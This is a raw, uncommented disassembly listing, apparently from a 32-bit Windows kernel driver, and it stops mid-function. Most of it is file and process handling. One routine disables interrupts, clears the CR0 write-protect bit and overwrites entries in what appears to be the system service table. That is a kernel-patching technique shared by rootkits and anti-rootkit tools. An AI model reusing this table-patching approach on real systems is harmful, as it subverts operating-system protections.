   16adb:	cmp    ecx,DWORD PTR [edi+0x18]
   16ade:	jne    0x16b9a
   16ae4:	lea    eax,[esi+0x10]
   16ae7:	push   eax
   16ae8:	lea    eax,[ebp-0x668]
   16aee:	push   eax
   16aef:	call   DWORD PTR ds:0x1b200
   16af5:	push   0x1
   16af7:	lea    eax,[ebp-0x668]
   16afd:	push   eax
   16afe:	lea    eax,[ebp-0x674]
   16b04:	push   eax
   16b05:	call   DWORD PTR ds:0x1b1fc
   16b0b:	test   eax,eax
   16b0d:	jne    0x16b9a
   16b13:	lea    eax,[edi+0x1c]
   16b16:	push   0x5c
   16b18:	push   eax
   16b19:	call   DWORD PTR ds:0x1b16c
   16b1f:	pop    ecx
   16b20:	pop    ecx
   16b21:	mov    DWORD PTR [ebp-0x66c],eax
   16b27:	cmp    eax,ebx
   16b29:	je     0x16b3b
   16b2b:	inc    eax
   16b2c:	inc    eax
   16b2d:	mov    DWORD PTR [ebp-0x66c],eax
   16b33:	push   eax
   16b34:	call   DWORD PTR ds:0x1b204
   16b3a:	pop    ecx
   16b3b:	push   0x5c
   16b3d:	push   DWORD PTR [ebp-0x670]
   16b43:	call   DWORD PTR ds:0x1b16c
   16b49:	pop    ecx
   16b4a:	pop    ecx
   16b4b:	mov    esi,eax
   16b4d:	cmp    esi,ebx
   16b4f:	je     0x16b5f
   16b51:	inc    esi
   16b52:	inc    esi
   16b53:	push   esi
   16b54:	call   DWORD PTR ds:0x1b204
   16b5a:	pop    ecx
   16b5b:	cmp    esi,ebx
   16b5d:	jne    0x16b65
   16b5f:	mov    esi,DWORD PTR [ebp-0x670]
   16b65:	mov    eax,DWORD PTR [ebp-0x66c]
   16b6b:	cmp    eax,ebx
   16b6d:	jne    0x16b72
   16b6f:	lea    eax,[edi+0x1c]
   16b72:	push   esi
   16b73:	push   eax
   16b74:	call   DWORD PTR ds:0x1b1c8
   16b7a:	pop    ecx
   16b7b:	pop    ecx
   16b7c:	test   eax,eax
   16b7e:	je     0x16b87
   16b80:	mov    BYTE PTR [ebp-0x625],0x1
   16b87:	lea    eax,[ebp-0x674]
   16b8d:	push   eax
   16b8e:	call   DWORD PTR ds:0x1b1f8
   16b94:	mov    esi,DWORD PTR [ebp-0x62c]
   16b9a:	inc    DWORD PTR [ebp-0x630]
   16ba0:	add    esi,0x11c
   16ba6:	mov    DWORD PTR [ebp-0x62c],esi
   16bac:	mov    eax,DWORD PTR [ebp-0x63c]
   16bb2:	mov    ecx,DWORD PTR [ebp-0x630]
   16bb8:	cmp    ecx,DWORD PTR [eax]
   16bba:	jb     0x16acd
   16bc0:	cmp    BYTE PTR [ebp-0x625],bl
   16bc6:	jne    0x16de3
   16bcc:	cmp    DWORD PTR [edi+0x14],ebx
   16bcf:	je     0x16de3
   16bd5:	cmp    DWORD PTR [edi+0x224],ebx
   16bdb:	je     0x16de3
   16be1:	cmp    DWORD PTR [edi+0x228],ebx
   16be7:	je     0x16de3
   16bed:	push   0x100
   16bf2:	push   0x1
   16bf4:	call   DWORD PTR ds:0x1b124
   16bfa:	mov    DWORD PTR [ebp-0x62c],eax
   16c00:	cmp    eax,ebx
   16c02:	je     0x16de3
   16c08:	push   0x100
   16c0d:	push   ebx
   16c0e:	push   eax
   16c0f:	call   0x1a1b0
   16c14:	add    esp,0xc
   16c17:	mov    DWORD PTR [ebp-0x634],ebx
   16c1d:	mov    esi,DWORD PTR [edi+0x14]
   16c20:	jmp    0x16c5a
   16c22:	mov    eax,DWORD PTR [ebp-0x634]
   16c28:	cmp    eax,0x100
   16c2d:	jae    0x16c5e
   16c2f:	cmp    eax,DWORD PTR [edi+0x228]
   16c35:	jae    0x16c5e
   16c37:	push   esi
   16c38:	call   DWORD PTR ds:0x1b130
   16c3e:	test   al,al
   16c40:	je     0x16c53
   16c42:	mov    al,BYTE PTR [esi]
   16c44:	mov    ecx,DWORD PTR [ebp-0x62c]
   16c4a:	mov    edx,DWORD PTR [ebp-0x634]
   16c50:	mov    BYTE PTR [edx+ecx*1],al
   16c53:	inc    esi
   16c54:	inc    DWORD PTR [ebp-0x634]
   16c5a:	cmp    esi,ebx
   16c5c:	jne    0x16c22
   16c5e:	push   DWORD PTR [ebp-0x634]
   16c64:	push   DWORD PTR [ebp-0x62c]
   16c6a:	call   0x10b16
   16c6f:	mov    esi,eax
   16c71:	push   ebx
   16c72:	push   DWORD PTR [ebp-0x62c]
   16c78:	call   DWORD PTR ds:0x1b278
   16c7e:	cmp    esi,ebx
   16c80:	je     0x16de3
   16c86:	cmp    esi,DWORD PTR [edi+0x224]
   16c8c:	jne    0x16de3
   16c92:	mov    eax,DWORD PTR [ebp-0x634]
   16c98:	cmp    eax,ebx
   16c9a:	je     0x16de3
   16ca0:	cmp    eax,DWORD PTR [edi+0x228]
   16ca6:	jne    0x16de3
   16cac:	push   0x208
   16cb1:	push   ebx
   16cb2:	lea    eax,[ebp-0x224]
   16cb8:	push   eax
   16cb9:	call   0x1a1b0
   16cbe:	add    esp,0xc
   16cc1:	push   ebx
   16cc2:	push   ebx
   16cc3:	lea    eax,[edi+0x1c]
   16cc6:	push   eax
   16cc7:	push   0x104
   16ccc:	lea    eax,[ebp-0x224]
   16cd2:	push   eax
   16cd3:	call   0x12610
   16cd8:	lea    eax,[ebp-0x224]
   16cde:	push   eax
   16cdf:	lea    eax,[ebp-0x674]
   16ce5:	push   eax
   16ce6:	call   DWORD PTR ds:0x1b164
   16cec:	push   0x1
   16cee:	lea    eax,[ebp-0x674]
   16cf4:	push   eax
   16cf5:	lea    eax,[ebp-0x668]
   16cfb:	push   eax
   16cfc:	call   DWORD PTR ds:0x1b224
   16d02:	test   eax,eax
   16d04:	jne    0x16ddd
   16d0a:	mov    DWORD PTR [ebp-0x660],0x18
   16d14:	mov    DWORD PTR [ebp-0x65c],ebx
   16d1a:	mov    DWORD PTR [ebp-0x654],0x240
   16d24:	lea    eax,[ebp-0x68c]
   16d2a:	mov    DWORD PTR [ebp-0x658],eax
   16d30:	mov    DWORD PTR [ebp-0x650],ebx
   16d36:	mov    DWORD PTR [ebp-0x64c],ebx
   16d3c:	push   ebx
   16d3d:	push   ebx
   16d3e:	push   0x60
   16d40:	push   0x3
   16d42:	push   0x1
   16d44:	push   0x80
   16d49:	push   ebx
   16d4a:	lea    eax,[ebp-0x684]
   16d50:	push   eax
   16d51:	lea    eax,[ebp-0x660]
   16d57:	push   eax
   16d58:	push   0x100004
   16d5d:	lea    eax,[ebp-0x638]
   16d63:	push   eax
   16d64:	call   DWORD PTR ds:0x1b1e0
   16d6a:	test   eax,eax
   16d6c:	jne    0x16dd0
   16d6e:	push   DWORD PTR [edi+0x22c]
   16d74:	push   DWORD PTR [ebp-0x664]
   16d7a:	push   DWORD PTR [edi+0xc]
   16d7d:	push   0x1af12
   16d82:	lea    eax,[ebp-0x624]
   16d88:	push   eax
   16d89:	call   DWORD PTR ds:0x1b220
   16d8f:	add    esp,0x14
   16d92:	lea    eax,[ebp-0x624]
   16d98:	lea    esi,[eax+0x1]
   16d9b:	mov    cl,BYTE PTR [eax]
   16d9d:	inc    eax
   16d9e:	cmp    cl,bl
   16da0:	jne    0x16d9b
   16da2:	sub    eax,esi
   16da4:	push   ebx
   16da5:	push   ebx
   16da6:	push   eax
   16da7:	lea    eax,[ebp-0x624]
   16dad:	push   eax
   16dae:	lea    eax,[ebp-0x684]
   16db4:	push   eax
   16db5:	push   ebx
   16db6:	push   ebx
   16db7:	push   ebx
   16db8:	push   DWORD PTR [ebp-0x638]
   16dbe:	call   DWORD PTR ds:0x1b1dc
   16dc4:	push   DWORD PTR [ebp-0x638]
   16dca:	call   DWORD PTR ds:0x1b180
   16dd0:	lea    eax,[ebp-0x668]
   16dd6:	push   eax
   16dd7:	call   DWORD PTR ds:0x1b21c
   16ddd:	inc    DWORD PTR [ebp-0x640]
   16de3:	mov    edi,DWORD PTR [edi+0x230]
   16de9:	cmp    edi,ebx
   16deb:	jne    0x16aa1
   16df1:	push   ebx
   16df2:	push   DWORD PTR [ebp-0x63c]
   16df8:	call   DWORD PTR ds:0x1b278
   16dfe:	push   0x5
   16e00:	call   0x10b52
   16e05:	mov    esi,eax
   16e07:	mov    DWORD PTR [ebp-0x698],esi
   16e0d:	cmp    esi,ebx
   16e0f:	je     0x172b5
   16e15:	mov    DWORD PTR [ebp-0x63c],eax
   16e1b:	xor    eax,eax
   16e1d:	lea    edi,[ebp-0x6a4]
   16e23:	stos   DWORD PTR es:[edi],eax
   16e24:	stos   DWORD PTR es:[edi],eax
   16e25:	mov    eax,DWORD PTR [esi+0x44]
   16e28:	mov    DWORD PTR [ebp-0x6a4],eax
   16e2e:	cmp    eax,0x4
   16e31:	jbe    0x172a2
   16e37:	push   0x18
   16e39:	pop    edi
   16e3a:	mov    DWORD PTR [ebp-0x660],edi
   16e40:	mov    DWORD PTR [ebp-0x65c],ebx
   16e46:	mov    DWORD PTR [ebp-0x654],0x200
   16e50:	mov    DWORD PTR [ebp-0x658],ebx
   16e56:	mov    DWORD PTR [ebp-0x650],ebx
   16e5c:	mov    DWORD PTR [ebp-0x64c],ebx
   16e62:	lea    eax,[ebp-0x6a4]
   16e68:	push   eax
   16e69:	lea    eax,[ebp-0x660]
   16e6f:	push   eax
   16e70:	push   0x1f0fff
   16e75:	lea    eax,[ebp-0x67c]
   16e7b:	push   eax
   16e7c:	call   DWORD PTR ds:0x1b1f0
   16e82:	test   eax,eax
   16e84:	jne    0x172a2
   16e8a:	lea    eax,[ebp-0x690]
   16e90:	push   eax
   16e91:	push   edi
   16e92:	lea    eax,[ebp-0x6bc]
   16e98:	push   eax
   16e99:	push   ebx
   16e9a:	push   DWORD PTR [ebp-0x67c]
   16ea0:	call   DWORD PTR ds:0x1b150
   16ea6:	test   eax,eax
   16ea8:	jne    0x17296
   16eae:	mov    eax,DWORD PTR [ebp-0x6b8]
   16eb4:	mov    DWORD PTR [ebp-0x69c],eax
   16eba:	cmp    eax,ebx
   16ebc:	je     0x17296
   16ec2:	lea    eax,[ebp-0x678]
   16ec8:	push   eax
   16ec9:	push   DWORD PTR [esi+0x44]
   16ecc:	call   DWORD PTR ds:0x1b27c
   16ed2:	cmp    eax,ebx
   16ed4:	jne    0x17296
   16eda:	push   edi
   16edb:	push   ebx
   16edc:	call   DWORD PTR ds:0x1b124
   16ee2:	mov    DWORD PTR [ebp-0x630],eax
   16ee8:	cmp    eax,ebx
   16eea:	je     0x1728a
   16ef0:	push   0x6
   16ef2:	pop    ecx
   16ef3:	xor    eax,eax
   16ef5:	mov    edi,DWORD PTR [ebp-0x630]
   16efb:	rep stos DWORD PTR es:[edi],eax
   16efd:	push   DWORD PTR [ebp-0x630]
   16f03:	push   DWORD PTR [ebp-0x678]
   16f09:	call   DWORD PTR ds:0x1b214
   16f0f:	mov    esi,DWORD PTR ds:0x1bfd4
   16f15:	mov    DWORD PTR [ebp-0x644],esi
   16f1b:	cmp    esi,ebx
   16f1d:	je     0x1726b
   16f23:	cmp    DWORD PTR [esi],0x2
   16f26:	jne    0x17250
   16f2c:	mov    eax,DWORD PTR [esi+0xc]
   16f2f:	mov    ecx,DWORD PTR [ebp-0x63c]
   16f35:	cmp    eax,DWORD PTR [ecx+0x44]
   16f38:	jne    0x17250
   16f3e:	mov    BYTE PTR [ebp-0x625],bl
   16f44:	mov    DWORD PTR [ebp-0x4],ebx
   16f47:	mov    eax,DWORD PTR [ebp-0x69c]
   16f4d:	mov    eax,DWORD PTR [eax+0xc]
   16f50:	add    eax,0xc
   16f53:	mov    DWORD PTR [ebp-0x62c],eax
   16f59:	mov    edi,DWORD PTR [eax]
   16f5b:	mov    DWORD PTR [ebp-0x694],edi
   16f61:	cmp    edi,eax
   16f63:	je     0x16fbc
   16f65:	mov    eax,DWORD PTR [edi+0x18]
   16f68:	mov    ecx,DWORD PTR [edi+0x20]
   16f6b:	cmp    eax,DWORD PTR [esi+0x10]
   16f6e:	jne    0x16fac
   16f70:	cmp    ecx,DWORD PTR [esi+0x18]
   16f73:	jne    0x16fac
   16f75:	push   0x5c
   16f77:	lea    eax,[esi+0x1c]
   16f7a:	push   eax
   16f7b:	call   DWORD PTR ds:0x1b16c
   16f81:	pop    ecx
   16f82:	pop    ecx
   16f83:	mov    DWORD PTR [ebp-0x66c],eax
   16f89:	cmp    eax,ebx
   16f8b:	je     0x16f95
   16f8d:	inc    eax
   16f8e:	inc    eax
   16f8f:	mov    DWORD PTR [ebp-0x66c],eax
   16f95:	push   eax
   16f96:	push   DWORD PTR [edi+0x30]
   16f99:	call   DWORD PTR ds:0x1b168
   16f9f:	pop    ecx
   16fa0:	pop    ecx
   16fa1:	test   eax,eax
   16fa3:	jne    0x16fac
   16fa5:	mov    BYTE PTR [ebp-0x625],0x1
   16fac:	mov    edi,DWORD PTR [edi]
   16fae:	mov    DWORD PTR [ebp-0x694],edi
   16fb4:	mov    eax,DWORD PTR [ebp-0x62c]
   16fba:	jmp    0x16f61
   16fbc:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   16fc3:	cmp    BYTE PTR [ebp-0x625],bl
   16fc9:	jne    0x17250
   16fcf:	cmp    DWORD PTR [esi+0x14],ebx
   16fd2:	je     0x17250
   16fd8:	cmp    DWORD PTR [esi+0x224],ebx
   16fde:	je     0x17250
   16fe4:	cmp    DWORD PTR [esi+0x228],ebx
   16fea:	je     0x17250
   16ff0:	mov    edi,0x100
   16ff5:	push   edi
   16ff6:	push   0x1
   16ff8:	call   DWORD PTR ds:0x1b124
   16ffe:	mov    DWORD PTR [ebp-0x62c],eax
   17004:	cmp    eax,ebx
   17006:	je     0x17250
   1700c:	push   edi
   1700d:	push   ebx
   1700e:	push   eax
   1700f:	call   0x1a1b0
   17014:	add    esp,0xc
   17017:	mov    DWORD PTR [ebp-0x4],0x1
   1701e:	xor    edi,edi
   17020:	mov    DWORD PTR [ebp-0x634],edi
   17026:	mov    eax,DWORD PTR [esi+0x14]
   17029:	mov    DWORD PTR [ebp-0x648],eax
   1702f:	cmp    DWORD PTR [ebp-0x648],ebx
   17035:	je     0x17078
   17037:	cmp    edi,0x100
   1703d:	jae    0x17078
   1703f:	cmp    edi,DWORD PTR [esi+0x228]
   17045:	jae    0x17078
   17047:	push   0x1
   17049:	push   DWORD PTR [ebp-0x648]
   1704f:	call   0x10a0a
   17054:	test   al,al
   17056:	je     0x17069
   17058:	mov    eax,DWORD PTR [ebp-0x648]
   1705e:	mov    al,BYTE PTR [eax]
   17060:	mov    ecx,DWORD PTR [ebp-0x62c]
   17066:	mov    BYTE PTR [edi+ecx*1],al
   17069:	inc    DWORD PTR [ebp-0x648]
   1706f:	inc    edi
   17070:	mov    DWORD PTR [ebp-0x634],edi
   17076:	jmp    0x1702f
   17078:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1707f:	jmp    0x1709d
   17081:	xor    eax,eax
   17083:	inc    eax
   17084:	ret    
   17085:	mov    esp,DWORD PTR [ebp-0x18]
   17088:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1708f:	xor    ebx,ebx
   17091:	mov    edi,DWORD PTR [ebp-0x634]
   17097:	mov    esi,DWORD PTR [ebp-0x644]
   1709d:	push   edi
   1709e:	push   DWORD PTR [ebp-0x62c]
   170a4:	call   0x10b16
   170a9:	mov    DWORD PTR [ebp-0x644],eax
   170af:	push   ebx
   170b0:	push   DWORD PTR [ebp-0x62c]
   170b6:	call   DWORD PTR ds:0x1b278
   170bc:	cmp    DWORD PTR [ebp-0x644],ebx
   170c2:	je     0x17250
   170c8:	mov    eax,DWORD PTR [ebp-0x644]
   170ce:	cmp    eax,DWORD PTR [esi+0x224]
   170d4:	jne    0x17250
   170da:	cmp    edi,ebx
   170dc:	je     0x17250
   170e2:	cmp    edi,DWORD PTR [esi+0x228]
   170e8:	jne    0x17250
   170ee:	push   DWORD PTR [ebp-0x630]
   170f4:	call   DWORD PTR ds:0x1b210
   170fa:	push   0x208
   170ff:	push   ebx
   17100:	lea    eax,[ebp-0x224]
   17106:	push   eax
   17107:	call   0x1a1b0
   1710c:	add    esp,0xc
   1710f:	push   ebx
   17110:	push   ebx
   17111:	lea    eax,[esi+0x1c]
   17114:	push   eax
   17115:	push   0x104
   1711a:	lea    eax,[ebp-0x224]
   17120:	push   eax
   17121:	call   0x12610
   17126:	lea    eax,[ebp-0x224]
   1712c:	push   eax
   1712d:	lea    eax,[ebp-0x674]
   17133:	push   eax
   17134:	call   DWORD PTR ds:0x1b164
   1713a:	push   0x1
   1713c:	lea    eax,[ebp-0x674]
   17142:	push   eax
   17143:	lea    eax,[ebp-0x668]
   17149:	push   eax
   1714a:	call   DWORD PTR ds:0x1b224
   17150:	test   eax,eax
   17152:	jne    0x1722b
   17158:	mov    DWORD PTR [ebp-0x660],0x18
   17162:	mov    DWORD PTR [ebp-0x65c],ebx
   17168:	mov    DWORD PTR [ebp-0x654],0x240
   17172:	lea    eax,[ebp-0x68c]
   17178:	mov    DWORD PTR [ebp-0x658],eax
   1717e:	mov    DWORD PTR [ebp-0x650],ebx
   17184:	mov    DWORD PTR [ebp-0x64c],ebx
   1718a:	push   ebx
   1718b:	push   ebx
   1718c:	push   0x60
   1718e:	push   0x3
   17190:	push   0x1
   17192:	push   0x80
   17197:	push   ebx
   17198:	lea    eax,[ebp-0x684]
   1719e:	push   eax
   1719f:	lea    eax,[ebp-0x660]
   171a5:	push   eax
   171a6:	push   0x100004
   171ab:	lea    eax,[ebp-0x638]
   171b1:	push   eax
   171b2:	call   DWORD PTR ds:0x1b1e0
   171b8:	test   eax,eax
   171ba:	jne    0x1721e
   171bc:	push   DWORD PTR [esi+0x22c]
   171c2:	push   DWORD PTR [ebp-0x664]
   171c8:	push   DWORD PTR [esi+0xc]
   171cb:	push   0x1af12
   171d0:	lea    eax,[ebp-0x624]
   171d6:	push   eax
   171d7:	call   DWORD PTR ds:0x1b220
   171dd:	add    esp,0x14
   171e0:	lea    eax,[ebp-0x624]
   171e6:	lea    edi,[eax+0x1]
   171e9:	mov    cl,BYTE PTR [eax]
   171eb:	inc    eax
   171ec:	cmp    cl,bl
   171ee:	jne    0x171e9
   171f0:	sub    eax,edi
   171f2:	push   ebx
   171f3:	push   ebx
   171f4:	push   eax
   171f5:	lea    eax,[ebp-0x624]
   171fb:	push   eax
   171fc:	lea    eax,[ebp-0x684]
   17202:	push   eax
   17203:	push   ebx
   17204:	push   ebx
   17205:	push   ebx
   17206:	push   DWORD PTR [ebp-0x638]
   1720c:	call   DWORD PTR ds:0x1b1dc
   17212:	push   DWORD PTR [ebp-0x638]
   17218:	call   DWORD PTR ds:0x1b180
   1721e:	lea    eax,[ebp-0x668]
   17224:	push   eax
   17225:	call   DWORD PTR ds:0x1b21c
   1722b:	push   0x6
   1722d:	pop    ecx
   1722e:	xor    eax,eax
   17230:	mov    edi,DWORD PTR [ebp-0x630]
   17236:	rep stos DWORD PTR es:[edi],eax
   17238:	push   DWORD PTR [ebp-0x630]
   1723e:	push   DWORD PTR [ebp-0x678]
   17244:	call   DWORD PTR ds:0x1b214
   1724a:	inc    DWORD PTR [ebp-0x640]
   17250:	mov    esi,DWORD PTR [esi+0x230]
   17256:	jmp    0x16f15
   1725b:	xor    eax,eax
   1725d:	inc    eax
   1725e:	ret    
   1725f:	mov    esp,DWORD PTR [ebp-0x18]
   17262:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17269:	xor    ebx,ebx
   1726b:	push   DWORD PTR [ebp-0x630]
   17271:	call   DWORD PTR ds:0x1b210
   17277:	push   ebx
   17278:	push   DWORD PTR [ebp-0x630]
   1727e:	call   DWORD PTR ds:0x1b278
   17284:	mov    esi,DWORD PTR [ebp-0x63c]
   1728a:	mov    ecx,DWORD PTR [ebp-0x678]
   17290:	call   DWORD PTR ds:0x1b284
   17296:	push   DWORD PTR [ebp-0x67c]
   1729c:	call   DWORD PTR ds:0x1b180
   172a2:	mov    eax,DWORD PTR [esi]
   172a4:	cmp    eax,ebx
   172a6:	jne    0x172c0
   172a8:	push   ebx
   172a9:	push   DWORD PTR [ebp-0x698]
   172af:	call   DWORD PTR ds:0x1b278
   172b5:	mov    edi,DWORD PTR ds:0x1bfd4
   172bb:	jmp    0x17416
   172c0:	add    esi,eax
   172c2:	mov    DWORD PTR [ebp-0x63c],esi
   172c8:	jmp    0x16e1b
   172cd:	cmp    DWORD PTR [edi],0x1
   172d0:	jne    0x17410
   172d6:	cmp    BYTE PTR [edi+0x4],bl
   172d9:	je     0x17410
   172df:	push   0x208
   172e4:	push   ebx
   172e5:	lea    eax,[ebp-0x224]
   172eb:	push   eax
   172ec:	call   0x1a1b0
   172f1:	add    esp,0xc
   172f4:	push   ebx
   172f5:	push   ebx
   172f6:	lea    eax,[edi+0x1c]
   172f9:	push   eax
   172fa:	push   0x104
   172ff:	lea    eax,[ebp-0x224]
   17305:	push   eax
   17306:	call   0x12610
   1730b:	lea    eax,[ebp-0x224]
   17311:	push   eax
   17312:	lea    eax,[ebp-0x674]
   17318:	push   eax
   17319:	call   DWORD PTR ds:0x1b164
   1731f:	push   0x1
   17321:	lea    eax,[ebp-0x674]
   17327:	push   eax
   17328:	lea    eax,[ebp-0x668]
   1732e:	push   eax
   1732f:	call   DWORD PTR ds:0x1b224
   17335:	test   eax,eax
   17337:	jne    0x17410
   1733d:	mov    DWORD PTR [ebp-0x660],0x18
   17347:	mov    DWORD PTR [ebp-0x65c],ebx
   1734d:	mov    DWORD PTR [ebp-0x654],0x240
   17357:	lea    eax,[ebp-0x68c]
   1735d:	mov    DWORD PTR [ebp-0x658],eax
   17363:	mov    DWORD PTR [ebp-0x650],ebx
   17369:	mov    DWORD PTR [ebp-0x64c],ebx
   1736f:	push   ebx
   17370:	push   ebx
   17371:	push   0x60
   17373:	push   0x3
   17375:	push   0x1
   17377:	push   0x80
   1737c:	push   ebx
   1737d:	lea    eax,[ebp-0x684]
   17383:	push   eax
   17384:	lea    eax,[ebp-0x660]
   1738a:	push   eax
   1738b:	push   0x100004
   17390:	lea    eax,[ebp-0x638]
   17396:	push   eax
   17397:	call   DWORD PTR ds:0x1b1e0
   1739d:	test   eax,eax
   1739f:	jne    0x17403
   173a1:	push   DWORD PTR [edi+0x22c]
   173a7:	push   DWORD PTR [ebp-0x664]
   173ad:	push   DWORD PTR [edi+0xc]
   173b0:	push   0x1af02
   173b5:	lea    eax,[ebp-0x624]
   173bb:	push   eax
   173bc:	call   DWORD PTR ds:0x1b220
   173c2:	add    esp,0x14
   173c5:	lea    eax,[ebp-0x624]
   173cb:	lea    esi,[eax+0x1]
   173ce:	mov    cl,BYTE PTR [eax]
   173d0:	inc    eax
   173d1:	cmp    cl,bl
   173d3:	jne    0x173ce
   173d5:	sub    eax,esi
   173d7:	push   ebx
   173d8:	push   ebx
   173d9:	push   eax
   173da:	lea    eax,[ebp-0x624]
   173e0:	push   eax
   173e1:	lea    eax,[ebp-0x684]
   173e7:	push   eax
   173e8:	push   ebx
   173e9:	push   ebx
   173ea:	push   ebx
   173eb:	push   DWORD PTR [ebp-0x638]
   173f1:	call   DWORD PTR ds:0x1b1dc
   173f7:	push   DWORD PTR [ebp-0x638]
   173fd:	call   DWORD PTR ds:0x1b180
   17403:	lea    eax,[ebp-0x668]
   17409:	push   eax
   1740a:	call   DWORD PTR ds:0x1b21c
   17410:	mov    edi,DWORD PTR [edi+0x230]
   17416:	cmp    edi,ebx
   17418:	jne    0x172cd
   1741e:	push   ebx
   1741f:	push   0x1c100
   17424:	call   DWORD PTR ds:0x1b1b0
   1742a:	mov    eax,DWORD PTR [ebp-0x640]
   17430:	call   0x1a3d4
   17435:	ret    0x4
   17438:	int3   
   17439:	int3   
   1743a:	int3   
   1743b:	int3   
   1743c:	int3   
   1743d:	int3   
   1743e:	mov    edi,edi
   17440:	push   ebp
   17441:	mov    ebp,esp
   17443:	sub    esp,0x10
   17446:	push   esi
   17447:	push   edi
   17448:	mov    edi,DWORD PTR [ebp+0x10]
   1744b:	xor    esi,esi
   1744d:	cmp    edi,esi
   1744f:	je     0x175e2
   17455:	cmp    DWORD PTR [ebp+0x14],esi
   17458:	je     0x175e2
   1745e:	or     DWORD PTR [ebp-0xc],0xffffffff
   17462:	lea    eax,[ebp-0x10]
   17465:	push   eax
   17466:	push   esi
   17467:	push   esi
   17468:	push   esi
   17469:	push   0x1c340
   1746e:	mov    DWORD PTR [ebp-0x10],0xfe363c80
   17475:	call   DWORD PTR ds:0x1b110
   1747b:	test   eax,eax
   1747d:	jne    0x175e2
   17483:	cmp    DWORD PTR [ebp+0x14],esi
   17486:	jbe    0x175d5
   1748c:	mov    eax,ds:0x1b17c
   17491:	mov    edx,DWORD PTR [eax]
   17493:	push   ebx
   17494:	sub    edi,edx
   17496:	mov    ebx,0x155ac
   1749b:	mov    ecx,DWORD PTR [edx]
   1749d:	mov    eax,DWORD PTR [edi+edx*1]
   174a0:	cmp    ecx,eax
   174a2:	je     0x1750a
   174a4:	test   eax,eax
   174a6:	je     0x1750a
   174a8:	cmp    BYTE PTR [ebp+0xc],0x0
   174ac:	je     0x17518
   174ae:	cmp    esi,DWORD PTR ds:0x1c050
   174b4:	jne    0x174be
   174b6:	cmp    ecx,0x150d0
   174bc:	jmp    0x17508
   174be:	cmp    esi,DWORD PTR ds:0x1c054
   174c4:	jne    0x174ce
   174c6:	cmp    ecx,0x153fc
   174cc:	jmp    0x17508
   174ce:	cmp    esi,DWORD PTR ds:0x1c058
   174d4:	jne    0x174de
   174d6:	cmp    ecx,0x14c50
   174dc:	jmp    0x17508
   174de:	cmp    esi,DWORD PTR ds:0x1c05c
   174e4:	jne    0x174ee
   174e6:	cmp    ecx,0x14d96
   174ec:	jmp    0x17508
   174ee:	cmp    esi,DWORD PTR ds:0x1c060
   174f4:	jne    0x174fe
   174f6:	cmp    ecx,0x14948
   174fc:	jmp    0x17508
   174fe:	cmp    esi,DWORD PTR ds:0x1c064
   17504:	jne    0x17518
   17506:	cmp    ecx,ebx
   17508:	jne    0x17518
   1750a:	inc    esi
   1750b:	add    edx,0x4
   1750e:	cmp    esi,DWORD PTR [ebp+0x14]
   17511:	jb     0x1749b
   17513:	jmp    0x175d4
   17518:	cmp    BYTE PTR [ebp+0x8],0x0
   1751c:	jne    0x17535
   1751e:	cli    
   1751f:	mov    eax,cr0
   17522:	mov    DWORD PTR [ebp-0x4],eax
   17525:	and    eax,0xfffeffff
   1752a:	mov    cr0,eax
   1752d:	call   0x106e0
   17532:	mov    BYTE PTR [ebp-0x8],al
   17535:	xor    edi,edi
   17537:	mov    eax,ds:0x1b17c
   1753c:	mov    eax,DWORD PTR [eax]
   1753e:	mov    ecx,DWORD PTR [ebp+0x10]
   17541:	mov    ecx,DWORD PTR [ecx+edi*4]
   17544:	lea    eax,[eax+edi*4]
   17547:	mov    esi,DWORD PTR [eax]
   17549:	cmp    esi,ecx
   1754b:	je     0x175b5
   1754d:	test   ecx,ecx
   1754f:	je     0x175b5
   17551:	cmp    BYTE PTR [ebp+0xc],0x0
   17555:	je     0x175b3
   17557:	cmp    edi,DWORD PTR ds:0x1c050
   1755d:	jne    0x17567
   1755f:	cmp    esi,0x150d0
   17565:	jmp    0x175b1
   17567:	cmp    edi,DWORD PTR ds:0x1c054
   1756d:	jne    0x17577
   1756f:	cmp    esi,0x153fc
   17575:	jmp    0x175b1
   17577:	cmp    edi,DWORD PTR ds:0x1c058
   1757d:	jne    0x17587
   1757f:	cmp    esi,0x14c50
   17585:	jmp    0x175b1
   17587:	cmp    edi,DWORD PTR ds:0x1c05c
   1758d:	jne    0x17597
   1758f:	cmp    esi,0x14d96
   17595:	jmp    0x175b1
   17597:	cmp    edi,DWORD PTR ds:0x1c060
   1759d:	jne    0x175a7
   1759f:	cmp    esi,0x14948
   175a5:	jmp    0x175b1
   175a7:	cmp    edi,DWORD PTR ds:0x1c064
   175ad:	jne    0x175b3
   175af:	cmp    esi,ebx
   175b1:	je     0x175b5
   175b3:	mov    DWORD PTR [eax],ecx
   175b5:	inc    edi
   175b6:	cmp    edi,DWORD PTR [ebp+0x14]
   175b9:	jb     0x17537
   175bf:	cmp    BYTE PTR [ebp+0x8],0x0
   175c3:	jne    0x175d4
   175c5:	push   DWORD PTR [ebp-0x8]
   175c8:	call   0x10714
   175cd:	mov    eax,DWORD PTR [ebp-0x4]
   175d0:	mov    cr0,eax
   175d3:	sti    
   175d4:	pop    ebx
   175d5:	push   0x0
   175d7:	push   0x1c340
   175dc:	call   DWORD PTR ds:0x1b1b0
   175e2:	pop    edi
   175e3:	pop    esi
   175e4:	leave  
   175e5:	ret    0x10
   175e8:	int3   
   175e9:	int3   
   175ea:	int3   
   175eb:	int3   
   175ec:	int3   
   175ed:	int3   
   175ee:	mov    edi,edi
   175f0:	push   ebp
   175f1:	mov    ebp,esp
   175f3:	sub    esp,0x10
   175f6:	push   ebx
   175f7:	xor    ebx,ebx
   175f9:	cmp    DWORD PTR [ebp+0xc],ebx
   175fc:	je     0x177bb
   17602:	or     DWORD PTR [ebp-0xc],0xffffffff
   17606:	lea    eax,[ebp-0x10]
   17609:	push   eax
   1760a:	push   ebx
   1760b:	push   ebx
   1760c:	push   ebx
   1760d:	push   0x1c340
   17612:	mov    DWORD PTR [ebp-0x10],0xfe363c80
   17619:	call   DWORD PTR ds:0x1b110
   1761f:	test   eax,eax
   17621:	jne    0x177bb
   17627:	mov    eax,ds:0x1b17c
   1762c:	mov    eax,DWORD PTR [eax]
   1762e:	mov    ecx,DWORD PTR ds:0x1c050
   17634:	push   esi
   17635:	mov    esi,0x150d0
   1763a:	cmp    DWORD PTR [eax+ecx*4],esi
   1763d:	push   edi
   1763e:	mov    edi,0x155ac
   17643:	jne    0x17690
   17645:	mov    ecx,DWORD PTR ds:0x1c054
